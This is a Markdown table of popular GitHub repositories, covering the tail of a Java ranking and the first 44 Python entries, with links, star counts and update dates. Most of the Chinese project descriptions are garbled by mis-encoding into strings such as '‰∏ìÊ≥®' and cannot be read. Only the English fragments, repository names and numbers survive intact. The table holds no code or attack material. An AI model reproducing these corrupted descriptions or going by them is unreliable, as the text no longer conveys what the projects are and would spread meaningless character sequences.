|186|[rememberber/WePush](https://github.com/rememberber/WePush)|‰∏ìÊ≥®ÊâπÈáèÊé®ÈÄÅÁöÑÂ∞èËÄåÁæéÁöÑÂ∑•ÂÖ∑ÔºåÁõÆÂâçÊîØÊåÅÔºöÊ®°ÊùøÊ∂àÊÅØ-ÂÖ¨‰ºóÂè∑„ÄÅÊ®°ÊùøÊ∂àÊÅØ-Â∞èÁ®ãÂ∫è„ÄÅÂæÆ‰ø°ÂÆ¢ÊúçÊ∂àÊÅØ„ÄÅÂæÆ‰ø°‰ºÅ‰∏öÂè∑/‰ºÅ‰∏öÂæÆ‰ø°Ê∂àÊÅØ„ÄÅÈòøÈáå‰∫ëÁü≠‰ø°„ÄÅÈòøÈáåÂ§ß‰∫éÊ®°ÊùøÁü≠‰ø° „ÄÅËÖæËÆØ‰∫ëÁü≠‰ø°„ÄÅ‰∫ëÁâáÁΩëÁü≠‰ø°„ÄÅE-Mail„ÄÅHTTPËØ∑Ê±Ç„ÄÅÈíâÈíâ„ÄÅÂçé‰∏∫‰∫ëÁü≠‰ø°„ÄÅÁôæÂ∫¶‰∫ëÁü≠‰ø°„ÄÅÂèàÊãç‰∫ëÁü≠‰ø°„ÄÅ‰∏ÉÁâõ‰∫ëÁü≠‰ø°|2.0k|Java|10/22|
|187|[xiaojinzi123/Component](https://github.com/xiaojinzi123/Component)|üî•üî•üî•A powerful componentized framework.‰∏Ä‰∏™Âº∫Â§ß„ÄÅ100% ÂÖºÂÆπ„ÄÅÊîØÊåÅ AndroidX„ÄÅÊîØÊåÅ KotlinÂπ∂‰∏îÁÅµÊ¥ªÁöÑÁªÑ‰ª∂ÂåñÊ°ÜÊû∂|2.0k|Java|10/26|
|188|[jianjunxiao/NiceVieoPlayer](https://github.com/jianjunxiao/NiceVieoPlayer)|IjkPlayer/MediaPlayer+TextureViewÔºåÊîØÊåÅÂàóË°®ÔºåÂÆåÁæéÂàáÊç¢ÂÖ®Â±è„ÄÅÂ∞èÁ™óÂè£ÁöÑAndroidËßÜÈ¢ëÊí≠ÊîæÂô® |2.0k|Java|02/04|
|189|[ngbdf/redis-manager](https://github.com/ngbdf/redis-manager)|Redis ‰∏ÄÁ´ôÂºèÁÆ°ÁêÜÂπ≥Âè∞ÔºåÊîØÊåÅÈõÜÁæ§ÁöÑÁõëÊéß„ÄÅÂÆâË£Ö„ÄÅÁÆ°ÁêÜ„ÄÅÂëäË≠¶‰ª•ÂèäÂü∫Êú¨ÁöÑÊï∞ÊçÆÊìç‰Ωú|2.0k|Java|10/14|
|190|[tianshiyeben/wgcloud](https://github.com/tianshiyeben/wgcloud)|linuxËøêÁª¥ÁõëÊéßÂ∑•ÂÖ∑|2.0k|Java|10/26|
|191|[CheckChe0803/flink-recommandSystem-demo](https://github.com/CheckChe0803/flink-recommandSystem-demo)|:helicopter::rocket:Âü∫‰∫éFlinkÂÆûÁé∞ÁöÑÂïÜÂìÅÂÆûÊó∂Êé®ËçêÁ≥ªÁªü„ÄÇflinkÁªüËÆ°ÂïÜÂìÅÁÉ≠Â∫¶ÔºåÊîæÂÖ•redisÁºìÂ≠òÔºåÂàÜÊûêÊó•Âøó‰ø°ÊÅØÔºåÂ∞ÜÁîªÂÉèÊ†áÁ≠æÂíåÂÆûÊó∂ËÆ∞ÂΩïÊîæÂÖ•Hbase„ÄÇÂú®Áî®Êà∑ÂèëËµ∑Êé®ËçêËØ∑Ê±ÇÂêéÔºåÊ†πÊçÆÁî®Êà∑ÁîªÂÉèÈáçÊéíÂ∫èÁÉ≠Â∫¶Ê¶úÔºåÂπ∂ÁªìÂêàÂçèÂêåËøáÊª§ÂíåÊ†áÁ≠æ‰∏§‰∏™Êé®ËçêÊ®°Âùó‰∏∫Êñ∞ÁîüÊàêÁöÑÊ¶úÂçïÁöÑÊØè‰∏Ä‰∏™‰∫ßÂìÅÊ∑ªÂä†ÂÖ≥ËÅî‰∫ßÂìÅÔºåÊúÄÂêéËøîÂõûÊñ∞ÁöÑÁî®Êà∑ÂàóË°®„ÄÇ|2.0k|Java|07/02|
|192|[baomidou/dynamic-datasource-spring-boot-starter](https://github.com/baomidou/dynamic-datasource-spring-boot-starter)|dynamic datasource for springboot Â§öÊï∞ÊçÆÊ∫ê Âä®ÊÄÅÊï∞ÊçÆÊ∫ê ‰∏ª‰ªéÂàÜÁ¶ª ËØªÂÜôÂàÜÁ¶ª ÂàÜÂ∏ÉÂºè‰∫ãÂä° https://dynamic-datasource.github.io/dynamic-datasource-doc/|2.0k|Java|10/06|
|193|[vivian8725118/TimeLine](https://github.com/vivian8725118/TimeLine)|ÁÄëÂ∏ÉÊµÅÂºèÁöÑÊó∂Èó¥ËΩ¥|2.0k|Java|09/01|
|194|[EhsanTang/ApiManager](https://github.com/EhsanTang/ApiManager)|CRAP - ÂºÄÊ∫êAPIÊé•Âè£ÁÆ°ÁêÜÂπ≥Âè∞   ÂÆåÂÖ®ÂºÄÊ∫ê„ÄÅÂÖçË¥π‰ΩøÁî®ÁöÑAPIÊé•Âè£ÁÆ°ÁêÜÁ≥ªÁªü„ÄÅBUGÁÆ°ÁêÜÁ≥ªÁªüÔºöAPIÊé•Âè£ÁÆ°ÁêÜ„ÄÅÊñáÊ°£ÁÆ°ÁêÜ„ÄÅÊï∞ÊçÆÂ∫ìË°®ÁÆ°ÁêÜ„ÄÅÊé•Âè£Ë∞ÉËØï„ÄÅÊµèËßàÂô®Ë∞ÉËØïÊèí‰ª∂„ÄÅÂØºÂá∫word&pdfÊé•Âè£‚Ä¶..ÔºåÈááÁî®SpringMVC + MyBatis + Lucene + Bootstrap + Angularjs + Iconfont + Guava Cache ÔºåÁ∫ø‰∏ä‰ΩøÁî®Âú∞ÂùÄÔºöhttp://api.crap.cn|1.9k|Java|10/13|
|195|[zhaojun1998/zfile](https://github.com/zhaojun1998/zfile)|Âú®Á∫ø‰∫ëÁõò„ÄÅÁΩëÁõò„ÄÅOneDrive„ÄÅ‰∫ëÂ≠òÂÇ®„ÄÅÁßÅÊúâ‰∫ë„ÄÅÂØπË±°Â≠òÂÇ®„ÄÅh5ai|1.9k|Java|10/07|
|196|[alibaba/yugong](https://github.com/alibaba/yugong)|ÈòøÈáåÂ∑¥Â∑¥ÂéªOracleÊï∞ÊçÆËøÅÁßªÂêåÊ≠•Â∑•ÂÖ∑(ÂÖ®Èáè+Â¢ûÈáè,ÁõÆÊ†áÊîØÊåÅMySQL/DRDS)|1.9k|Java|10/13|
|197|[zhangdaiscott/jeecg](https://github.com/zhangdaiscott/jeecg)|JEECGÊòØ‰∏ÄÊ¨æÂü∫‰∫é‰ª£Á†ÅÁîüÊàêÂô®ÁöÑJ2EEÂø´ÈÄüÂºÄÂèëÂπ≥Âè∞ÔºåÂºÄÊ∫êÁïå‚ÄúÂ∞èÊôÆÂÖÉ‚ÄùË∂ÖË∂ä‰º†ÁªüÂïÜ‰∏ö‰ºÅ‰∏öÁ∫ßÂºÄÂèëÂπ≥Âè∞„ÄÇÂºïÈ¢ÜÊñ∞ÁöÑÂºÄÂèëÊ®°Âºè(Online CodingÊ®°Âºè(Ëá™ÂÆö‰πâË°®Âçï) - > ‰ª£Á†ÅÁîüÊàêÂô®Ê®°Âºè - > ÊâãÂ∑•MERGEÊô∫ËÉΩÂºÄÂèë)Ôºå ÂèØ‰ª•Â∏ÆÂä©Ëß£ÂÜ≥JavaÈ°πÁõÆ90%ÁöÑÈáçÂ§çÂ∑•‰ΩúÔºåËÆ©ÂºÄÂèëÊõ¥Â§öÂÖ≥Ê≥®‰∏öÂä°ÈÄªËæë„ÄÇÊó¢ËÉΩÂø´ÈÄüÊèêÈ´òÂºÄÂèëÊïàÁéáÔºåÂ∏ÆÂä©ÂÖ¨Âè∏ËäÇÁúÅ‰∫∫ÂäõÊàêÊú¨ÔºåÂêåÊó∂Âèà‰∏çÂ§±ÁÅµÊ¥ªÊÄß„ÄÇÂÖ∑Â§áÔºöË°®ÂçïÈÖçÁΩÆËÉΩÂäõÔºàÊó†ÈúÄÁºñÁ†ÅÔºâ„ÄÅÁßªÂä®ÈÖçÁΩÆËÉΩÂäõ„ÄÅÂ∑•‰ΩúÊµÅÈÖçÁΩÆËÉΩÂäõ„ÄÅÊä•Ë°®ÈÖçÁΩÆËÉΩÂäõÔºàÊîØÊåÅÁßªÂä®Á´ØÔºâ„ÄÅÊèí‰ª∂ÂºÄÂèëËÉΩÂäõÔºàÂèØÊèíÊãîÔºâ|1.9k|Java|10/13|
|198|[forezp/SpringBootLearning](https://github.com/forezp/SpringBootLearning)|„ÄäSpring BootÊïôÁ®ã„ÄãÊ∫êÁ†Å|1.9k|Java|07/02|
|199|[SpringForAll/spring-boot-starter-swagger](https://github.com/SpringForAll/spring-boot-starter-swagger)|Ëá™Âà∂spring boot starter for swagger 2.xÔºåÊù•ËØïËØïÂêßÔºåÂæàÂ•ΩÁî®Âì¶~|1.9k|Java|10/23|
|200|[HpWens/MeiWidgetView](https://github.com/HpWens/MeiWidgetView)|üî•‰∏ÄÊ¨æÊ±áÊÄª‰∫ÜÈÉ≠ÈúñÔºåÈ∏øÊ¥ãÔºå‰ª•ÂèäËá™Â∑±Âπ≥Êó∂Êî∂ÈõÜÁöÑËá™ÂÆö‰πâÊéß‰ª∂ÈõÜÂêàÂ∫ìÔºàÂ∞èÁ∫¢‰π¶Ôºâ|1.9k|Java|04/26|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## Python

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[jackfrued/Python-100-Days](https://github.com/jackfrued/Python-100-Days)|Python - 100Â§©‰ªéÊñ∞ÊâãÂà∞Â§ßÂ∏à|94.7k|Python|10/22|
|2|[521xueweihan/HelloGitHub](https://github.com/521xueweihan/HelloGitHub)|:octocat: Find pearls on open-source seashore ÂàÜ‰∫´ GitHub ‰∏äÊúâË∂£„ÄÅÂÖ•Èó®Á∫ßÁöÑÂºÄÊ∫êÈ°πÁõÆ|34.4k|Python|10/28|
|3|[0voice/interview_internal_reference](https://github.com/0voice/interview_internal_reference)|2020Âπ¥ÊúÄÊñ∞ÊÄªÁªìÔºåÈòøÈáåÔºåËÖæËÆØÔºåÁôæÂ∫¶ÔºåÁæéÂõ¢ÔºåÂ§¥Êù°Á≠âÊäÄÊúØÈù¢ËØïÈ¢òÁõÆÔºå‰ª•ÂèäÁ≠îÊ°àÔºå‰∏ìÂÆ∂Âá∫È¢ò‰∫∫ÂàÜÊûêÊ±áÊÄª„ÄÇ|29.2k|Python|10/17|
|4|[testerSunshine/12306](https://github.com/testerSunshine/12306)|12306Êô∫ËÉΩÂà∑Á•®ÔºåËÆ¢Á•®|28.8k|Python|09/26|
|5|[apachecn/AiLearning](https://github.com/apachecn/AiLearning)|AiLearning: Êú∫Âô®Â≠¶‰π† - MachineLearning - ML„ÄÅÊ∑±Â∫¶Â≠¶‰π† - DeepLearning - DL„ÄÅËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ NLP|27.6k|Python|10/27|
|6|[fighting41love/funNLP](https://github.com/fighting41love/funNLP)|‰∏≠Ëã±ÊñáÊïèÊÑüËØç„ÄÅËØ≠Ë®ÄÊ£ÄÊµã„ÄÅ‰∏≠Â§ñÊâãÊú∫/ÁîµËØùÂΩíÂ±ûÂú∞/ËøêËê•ÂïÜÊü•ËØ¢„ÄÅÂêçÂ≠óÊé®Êñ≠ÊÄßÂà´„ÄÅÊâãÊú∫Âè∑ÊäΩÂèñ„ÄÅË∫´‰ªΩËØÅÊäΩÂèñ„ÄÅÈÇÆÁÆ±ÊäΩÂèñ„ÄÅ‰∏≠Êó•Êñá‰∫∫ÂêçÂ∫ì„ÄÅ‰∏≠ÊñáÁº©ÂÜôÂ∫ì„ÄÅÊãÜÂ≠óËØçÂÖ∏„ÄÅËØçÊ±áÊÉÖÊÑüÂÄº„ÄÅÂÅúÁî®ËØç„ÄÅÂèçÂä®ËØçË°®„ÄÅÊö¥ÊÅêËØçË°®„ÄÅÁπÅÁÆÄ‰ΩìËΩ¨Êç¢„ÄÅËã±ÊñáÊ®°Êãü‰∏≠ÊñáÂèëÈü≥„ÄÅÊ±™Â≥∞Ê≠åËØçÁîüÊàêÂô®„ÄÅËÅå‰∏öÂêçÁß∞ËØçÂ∫ì„ÄÅÂêå‰πâËØçÂ∫ì„ÄÅÂèç‰πâËØçÂ∫ì„ÄÅÂê¶ÂÆöËØçÂ∫ì„ÄÅÊ±ΩËΩ¶ÂìÅÁâåËØçÂ∫ì„ÄÅÊ±ΩËΩ¶Èõ∂‰ª∂ËØçÂ∫ì„ÄÅËøûÁª≠Ëã±ÊñáÂàáÂâ≤„ÄÅÂêÑÁßç‰∏≠ÊñáËØçÂêëÈáè„ÄÅÂÖ¨Âè∏ÂêçÂ≠óÂ§ßÂÖ®„ÄÅÂè§ËØóËØçÂ∫ì„ÄÅITËØçÂ∫ì„ÄÅË¥¢ÁªèËØçÂ∫ì„ÄÅÊàêËØ≠ËØçÂ∫ì„ÄÅÂú∞ÂêçËØçÂ∫ì„ÄÅÂéÜÂè≤Âêç‰∫∫ËØçÂ∫ì„ÄÅËØóËØçËØçÂ∫ì„ÄÅÂåªÂ≠¶ËØçÂ∫ì„ÄÅÈ•ÆÈ£üËØçÂ∫ì„ÄÅÊ≥ïÂæãËØçÂ∫ì„ÄÅÊ±ΩËΩ¶ËØçÂ∫ì„ÄÅÂä®Áâ©ËØçÂ∫ì„ÄÅ‰∏≠ÊñáËÅäÂ§©ËØ≠Êñô„ÄÅ‰∏≠ÊñáË∞£Ë®ÄÊï∞ÊçÆ„ÄÅÁôæÂ∫¶‰∏≠ÊñáÈóÆÁ≠îÊï∞ÊçÆÈõÜ„ÄÅÂè•Â≠êÁõ∏‰ººÂ∫¶ÂåπÈÖçÁÆóÊ≥ïÈõÜÂêà„ÄÅbertËµÑÊ∫ê„ÄÅÊñáÊú¨ÁîüÊàê&ÊëòË¶ÅÁõ∏ÂÖ≥Â∑•ÂÖ∑„ÄÅcocoNLP‰ø°ÊÅØÊäΩÂèñ ...|25.6k|Python|10/02|
|7|[fxsjy/jieba](https://github.com/fxsjy/jieba)|ÁªìÂ∑¥‰∏≠ÊñáÂàÜËØç|24.5k|Python|07/24|
|8|[hankcs/HanLP](https://github.com/hankcs/HanLP)|‰∏≠ÊñáÂàÜËØç ËØçÊÄßÊ†áÊ≥® ÂëΩÂêçÂÆû‰ΩìËØÜÂà´ ‰æùÂ≠òÂè•Ê≥ïÂàÜÊûê ËØ≠‰πâ‰æùÂ≠òÂàÜÊûê Êñ∞ËØçÂèëÁé∞ ÂÖ≥ÈîÆËØçÁü≠ËØ≠ÊèêÂèñ Ëá™Âä®ÊëòË¶Å ÊñáÊú¨ÂàÜÁ±ªËÅöÁ±ª ÊãºÈü≥ÁÆÄÁπÅËΩ¨Êç¢ Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ|21.1k|Python|10/29|
|9|[littlecodersh/ItChat](https://github.com/littlecodersh/ItChat)|A complete and graceful API for Wechat. ÂæÆ‰ø°‰∏™‰∫∫Âè∑Êé•Âè£„ÄÅÂæÆ‰ø°Êú∫Âô®‰∫∫ÂèäÂëΩ‰ª§Ë°åÂæÆ‰ø°Ôºå‰∏âÂçÅË°åÂç≥ÂèØËá™ÂÆö‰πâ‰∏™‰∫∫Âè∑Êú∫Âô®‰∫∫„ÄÇ|20.9k|Python|10/28|
|10|[d2l-ai/d2l-zh](https://github.com/d2l-ai/d2l-zh)|„ÄäÂä®ÊâãÂ≠¶Ê∑±Â∫¶Â≠¶‰π†„ÄãÔºöÈù¢Âêë‰∏≠ÊñáËØªËÄÖ„ÄÅËÉΩËøêË°å„ÄÅÂèØËÆ®ËÆ∫„ÄÇËã±ÊñáÁâàÂç≥‰ºØÂÖãÂà©‚ÄúÊ∑±Â∫¶Â≠¶‰π†ÂØºËÆ∫‚ÄùÊïôÊùê„ÄÇ|19.0k|Python|10/29|
|11|[wangzheng0822/algo](https://github.com/wangzheng0822/algo)|Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ïÂøÖÁü•ÂøÖ‰ºöÁöÑ50‰∏™‰ª£Á†ÅÂÆûÁé∞|16.9k|Python|10/29|
|12|[jumpserver/jumpserver](https://github.com/jumpserver/jumpserver)|JumpServer ÊòØÂÖ®ÁêÉÈ¶ñÊ¨æÂºÄÊ∫êÁöÑÂ†°ÂûíÊú∫ÔºåÊòØÁ¨¶Âêà 4A ÁöÑ‰∏ì‰∏öËøêÁª¥ÂÆâÂÖ®ÂÆ°ËÆ°Á≥ªÁªü„ÄÇ|14.2k|Python|10/29|
|13|[wangshub/wechat_jump_game](https://github.com/wangshub/wechat_jump_game)|ÂæÆ‰ø°„ÄäË∑≥‰∏ÄË∑≥„ÄãPython ËæÖÂä©|13.9k|Python|10/10|
|14|[PaddlePaddle/Paddle](https://github.com/PaddlePaddle/Paddle)|PArallel Distributed Deep LEarning: Machine Learning Framework from Industrial Practice Ôºà„ÄéÈ£ûÊ°®„ÄèÊ†∏ÂøÉÊ°ÜÊû∂ÔºåÊ∑±Â∫¶Â≠¶‰π†&Êú∫Âô®Â≠¶‰π†È´òÊÄßËÉΩÂçïÊú∫„ÄÅÂàÜÂ∏ÉÂºèËÆ≠ÁªÉÂíåË∑®Âπ≥Âè∞ÈÉ®ÁΩ≤Ôºâ|13.2k|Python|10/30|
|15|[Kr1s77/awesome-python-login-model](https://github.com/Kr1s77/awesome-python-login-model)|üòÆpythonÊ®°ÊãüÁôªÈôÜ‰∏Ä‰∫õÂ§ßÂûãÁΩëÁ´ôÔºåËøòÊúâ‰∏Ä‰∫õÁÆÄÂçïÁöÑÁà¨Ëô´ÔºåÂ∏åÊúõÂØπ‰Ω†‰ª¨ÊúâÊâÄÂ∏ÆÂä©‚ù§Ô∏èÔºåÂ¶ÇÊûúÂñúÊ¨¢ËÆ∞ÂæóÁªô‰∏™starÂì¶üåü|12.4k|Python|10/02|
|16|[shimohq/chinese-programmer-wrong-pronunciation](https://github.com/shimohq/chinese-programmer-wrong-pronunciation)|‰∏≠ÂõΩÁ®ãÂ∫èÂëòÂÆπÊòìÂèëÈü≥ÈîôËØØÁöÑÂçïËØç|12.1k|Python|10/08|
|17|[Jack-Cherish/python-spider](https://github.com/Jack-Cherish/python-spider)|:rainbow:Python3ÁΩëÁªúÁà¨Ëô´ÂÆûÊàòÔºöÊ∑òÂÆù„ÄÅ‰∫¨‰∏ú„ÄÅÁΩëÊòì‰∫ë„ÄÅBÁ´ô„ÄÅ12306„ÄÅÊäñÈü≥„ÄÅÁ¨îË∂£ÈòÅ„ÄÅÊº´ÁîªÂ∞èËØ¥‰∏ãËΩΩ„ÄÅÈü≥‰πêÁîµÂΩ±‰∏ãËΩΩÁ≠â|11.6k|Python|09/25|
|18|[pjialin/py12306](https://github.com/pjialin/py12306)|üöÇ 12306 Ë¥≠Á•®Âä©ÊâãÔºåÊîØÊåÅÈõÜÁæ§ÔºåÂ§öË¥¶Âè∑ÔºåÂ§ö‰ªªÂä°Ë¥≠Á•®‰ª•Âèä Web È°µÈù¢ÁÆ°ÁêÜ |11.2k|Python|04/08|
|19|[jhao104/proxy_pool](https://github.com/jhao104/proxy_pool)|PythonÁà¨Ëô´‰ª£ÁêÜIPÊ±†(proxy pool)|10.9k|Python|10/26|
|20|[leisurelicht/wtfpython-cn](https://github.com/leisurelicht/wtfpython-cn)|wtfpythonÁöÑ‰∏≠ÊñáÁøªËØë/ÊñΩÂ∑•ÁªìÊùü/ ËÉΩÂäõÊúâÈôêÔºåÊ¨¢ËøéÂ∏ÆÊàëÊîπËøõÁøªËØë|10.8k|Python|06/13|
|21|[meolu/walle-web](https://github.com/meolu/walle-web)|walle - Áì¶Âäõ DevopsÂºÄÊ∫êÈ°πÁõÆ‰ª£Á†ÅÈÉ®ÁΩ≤Âπ≥Âè∞|10.5k|Python|08/20|
|22|[h2y/Shadowrocket-ADBlock-Rules](https://github.com/h2y/Shadowrocket-ADBlock-Rules)|Êèê‰æõÂ§öÊ¨æ Shadowrocket ËßÑÂàôÔºåÂ∏¶ÂπøÂëäËøáÊª§ÂäüËÉΩ„ÄÇÁî®‰∫é iOS Êú™Ë∂äÁã±ËÆæÂ§áÈÄâÊã©ÊÄßÂú∞Ëá™Âä®ÁøªÂ¢ô„ÄÇ|9.7k|Python|10/29|
|23|[shengqiangzhang/examples-of-web-crawlers](https://github.com/shengqiangzhang/examples-of-web-crawlers)|‰∏Ä‰∫õÈùûÂ∏∏ÊúâË∂£ÁöÑpythonÁà¨Ëô´‰æãÂ≠ê,ÂØπÊñ∞ÊâãÊØîËæÉÂèãÂ•Ω,‰∏ªË¶ÅÁà¨ÂèñÊ∑òÂÆù„ÄÅÂ§©Áå´„ÄÅÂæÆ‰ø°„ÄÅË±ÜÁì£„ÄÅQQÁ≠âÁΩëÁ´ô„ÄÇ(Some interesting examples of python crawlers that are friendly to beginners. )|9.2k|Python|05/15|
|24|[darknessomi/musicbox](https://github.com/darknessomi/musicbox)|ÁΩëÊòì‰∫ëÈü≥‰πêÂëΩ‰ª§Ë°åÁâàÊú¨|8.6k|Python|10/23|
|25|[Embedding/Chinese-Word-Vectors](https://github.com/Embedding/Chinese-Word-Vectors)|100+ Chinese Word Vectors ‰∏äÁôæÁßçÈ¢ÑËÆ≠ÁªÉ‰∏≠ÊñáËØçÂêëÈáè |8.0k|Python|08/24|
|26|[sfyc23/EverydayWechat](https://github.com/sfyc23/EverydayWechat)|ÂæÆ‰ø°Âä©ÊâãÔºö1.ÊØèÊó•ÂÆöÊó∂ÁªôÂ•ΩÂèãÔºàÂ•≥ÂèãÔºâÂèëÈÄÅÂÆöÂà∂Ê∂àÊÅØ„ÄÇ2.Êú∫Âô®‰∫∫Ëá™Âä®ÂõûÂ§çÂ•ΩÂèã„ÄÇ3.Áæ§Âä©ÊâãÂäüËÉΩÔºà‰æãÂ¶ÇÔºöÊü•ËØ¢ÂûÉÂúæÂàÜÁ±ª„ÄÅÂ§©Ê∞î„ÄÅÊó•ÂéÜ„ÄÅÁîµÂΩ±ÂÆûÊó∂Á•®Êàø„ÄÅÂø´ÈÄíÁâ©ÊµÅ„ÄÅPM2.5Á≠âÔºâ|7.7k|Python|09/28|
|27|[sylnsfar/qrcode](https://github.com/sylnsfar/qrcode)|artistic QR Code in Python ÔºàAnimated GIF qr codeÔºâ- Python Ëâ∫ÊúØ‰∫åÁª¥Á†ÅÁîüÊàêÂô® ÔºàGIFÂä®ÊÄÅ‰∫åÁª¥Á†Å„ÄÅÂõæÁâá‰∫åÁª¥Á†ÅÔºâ|7.7k|Python|10/25|
|28|[hoochanlon/w3-goto-world](https://github.com/hoochanlon/w3-goto-world)|üçÖGit/AWS/Google ÈïúÂÉè ,SS/SSR/VMESSËäÇÁÇπ,WireGuard,IPFS, DeepWeb,Capitalism Áü•ËØÜÂÇ®Â§áÂ∫ì|7.6k|Python|10/26|
|29|[pwxcoo/chinese-xinhua](https://github.com/pwxcoo/chinese-xinhua)|:orange_book: ‰∏≠ÂçéÊñ∞ÂçéÂ≠óÂÖ∏Êï∞ÊçÆÂ∫ì„ÄÇÂåÖÊã¨Ê≠áÂêéËØ≠ÔºåÊàêËØ≠ÔºåËØçËØ≠ÔºåÊ±âÂ≠ó„ÄÇ|7.4k|Python|10/18|
|30|[vipstone/faceai](https://github.com/vipstone/faceai)|‰∏ÄÊ¨æÂÖ•Èó®Á∫ßÁöÑ‰∫∫ËÑ∏„ÄÅËßÜÈ¢ë„ÄÅÊñáÂ≠óÊ£ÄÊµã‰ª•ÂèäËØÜÂà´ÁöÑÈ°πÁõÆ.|7.3k|Python|04/16|
|31|[wangshub/Douyin-Bot](https://github.com/wangshub/Douyin-Bot)|üòç Python ÊäñÈü≥Êú∫Âô®‰∫∫ÔºåËÆ∫Â¶Ç‰ΩïÂú®ÊäñÈü≥‰∏äÊâæÂà∞ÊºÇ‰∫ÆÂ∞èÂßêÂßêÔºü |7.2k|Python|05/07|
|32|[luyishisi/Anti-Anti-Spider](https://github.com/luyishisi/Anti-Anti-Spider)|Ë∂äÊù•Ë∂äÂ§öÁöÑÁΩëÁ´ôÂÖ∑ÊúâÂèçÁà¨Ëô´ÁâπÊÄßÔºåÊúâÁöÑÁî®ÂõæÁâáÈöêËóèÂÖ≥ÈîÆÊï∞ÊçÆÔºåÊúâÁöÑ‰ΩøÁî®Âèç‰∫∫Á±ªÁöÑÈ™åËØÅÁ†ÅÔºåÂª∫Á´ãÂèçÂèçÁà¨Ëô´ÁöÑ‰ª£Á†Å‰ªìÂ∫ìÔºåÈÄöËøá‰∏é‰∏çÂêåÁâπÊÄßÁöÑÁΩëÁ´ôÂÅöÊñó‰∫âÔºàÊó†ÊÅ∂ÊÑèÔºâÊèêÈ´òÊäÄÊúØ„ÄÇÔºàÊ¨¢ËøéÊèê‰∫§Èöæ‰ª•ÈááÈõÜÁöÑÁΩëÁ´ôÔºâÔºàÂõ†Â∑•‰ΩúÂéüÂõ†ÔºåÈ°πÁõÆÊöÇÂÅúÔºâ |6.5k|Python|06/29|
|33|[Dod-o/Statistical-Learning-Method_Code](https://github.com/Dod-o/Statistical-Learning-Method_Code)|ÊâãÂÜôÂÆûÁé∞ÊùéËà™„ÄäÁªüËÆ°Â≠¶‰π†ÊñπÊ≥ï„Äã‰π¶‰∏≠ÂÖ®ÈÉ®ÁÆóÊ≥ï|6.4k|Python|09/08|
|34|[jindongwang/transferlearning](https://github.com/jindongwang/transferlearning)|Everything about Transfer Learning and Domain Adaptation--ËøÅÁßªÂ≠¶‰π†|6.1k|Python|10/25|
|35|[injetlee/Python](https://github.com/injetlee/Python)|PythonËÑöÊú¨„ÄÇÊ®°ÊãüÁôªÂΩïÁü•‰πéÔºå Áà¨Ëô´ÔºåÊìç‰ΩúexcelÔºåÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÔºåËøúÁ®ãÂºÄÊú∫|5.9k|Python|10/07|
|36|[Vonng/ddia](https://github.com/Vonng/ddia)|„ÄäDesigning Data-Intensive Application„ÄãDDIA‰∏≠ÊñáÁøªËØë|5.6k|Python|10/26|
|37|[houtianze/bypy](https://github.com/houtianze/bypy)|Python client for Baidu Yun (Personal Cloud Storage) ÁôæÂ∫¶‰∫ë/ÁôæÂ∫¶ÁΩëÁõòPythonÂÆ¢Êà∑Á´Ø|5.5k|Python|10/16|
|38|[Linzaer/Ultra-Light-Fast-Generic-Face-Detector-1MB](https://github.com/Linzaer/Ultra-Light-Fast-Generic-Face-Detector-1MB)| üíé1MB lightweight face detection model  (1MBËΩªÈáèÁ∫ß‰∫∫ËÑ∏Ê£ÄÊµãÊ®°Âûã)|5.4k|Python|10/22|
|39|[PaddlePaddle/models](https://github.com/PaddlePaddle/models)|Pre-trained and Reproduced Deep Learning Models Ôºà„ÄéÈ£ûÊ°®„ÄèÂÆòÊñπÊ®°ÂûãÂ∫ìÔºåÂåÖÂê´Â§öÁßçÂ≠¶ÊúØÂâçÊ≤øÂíåÂ∑•‰∏öÂú∫ÊôØÈ™åËØÅÁöÑÊ∑±Â∫¶Â≠¶‰π†Ê®°ÂûãÔºâ|5.3k|Python|10/29|
|40|[jackzhenguo/python-small-examples](https://github.com/jackzhenguo/python-small-examples)|ÂëäÂà´ÊûØÁá•ÔºåËá¥Âäõ‰∫éÊâìÈÄ† Python ÂØåÊúâ‰ΩìÁ≥ª‰∏îÂÆûÁî®ÁöÑÂ∞è‰æãÂ≠ê„ÄÅÂ∞èÊ°à‰æã„ÄÇ|5.2k|Python|10/23|
|41|[lancopku/pkuseg-python](https://github.com/lancopku/pkuseg-python)|pkusegÂ§öÈ¢ÜÂüü‰∏≠ÊñáÂàÜËØçÂ∑•ÂÖ∑; The pkuseg toolkit for multi-domain Chinese word segmentation|5.1k|Python|06/21|
|42|[lining0806/PythonSpiderNotes](https://github.com/lining0806/PythonSpiderNotes)|PythonÂÖ•Èó®ÁΩëÁªúÁà¨Ëô´‰πãÁ≤æÂçéÁâà|5.1k|Python|10/02|
|43|[wistbean/learn_python3_spider](https://github.com/wistbean/learn_python3_spider)|pythonÁà¨Ëô´ÊïôÁ®ãÁ≥ªÂàó„ÄÅ‰ªé0Âà∞1Â≠¶‰π†pythonÁà¨Ëô´ÔºåÂåÖÊã¨ÊµèËßàÂô®ÊäìÂåÖÔºåÊâãÊú∫APPÊäìÂåÖÔºåÂ¶Ç fiddler„ÄÅmitmproxyÔºåÂêÑÁßçÁà¨Ëô´Ê∂âÂèäÁöÑÊ®°ÂùóÁöÑ‰ΩøÁî®ÔºåÂ¶ÇÔºörequests„ÄÅbeautifulSoup„ÄÅselenium„ÄÅappium„ÄÅscrapyÁ≠âÔºå‰ª•ÂèäIP‰ª£ÁêÜÔºåÈ™åËØÅÁ†ÅËØÜÂà´ÔºåMysqlÔºåMongoDBÊï∞ÊçÆÂ∫ìÁöÑpython‰ΩøÁî®ÔºåÂ§öÁ∫øÁ®ãÂ§öËøõÁ®ãÁà¨Ëô´ÁöÑ‰ΩøÁî®Ôºåcss Áà¨Ëô´Âä†ÂØÜÈÄÜÂêëÁ†¥Ëß£ÔºåJSÁà¨Ëô´ÈÄÜÂêëÔºåÂàÜÂ∏ÉÂºèÁà¨Ëô´ÔºåÁà¨Ëô´È°πÁõÆÂÆûÊàòÂÆû‰æãÁ≠â|5.0k|Python|10/16|
|44|[0x5e/wechat-deleted-friends](https://github.com/0x5e/wechat-deleted-friends)|Êü•ÁúãË¢´Âà†ÁöÑÂæÆ‰ø°Â•ΩÂèã|4.9k|Python|10/01|
